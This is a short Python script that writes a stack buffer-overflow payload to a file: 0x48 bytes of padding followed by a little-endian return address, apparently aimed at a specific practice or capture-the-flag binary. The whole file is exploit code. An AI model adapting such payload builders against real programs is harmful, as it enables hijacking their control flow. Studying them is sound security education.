def p32(address):
    return address.to_bytes(4, byteorder='little')


if __name__ == "__main__":
    target_address = 0x40119e
    offset = 0x48
    payload = b"A" * offset + p32(target_address)

    with open("payload.txt", "wb") as f:
        f.write(payload)

    print(f"Payload written to payload.txt: {payload}")
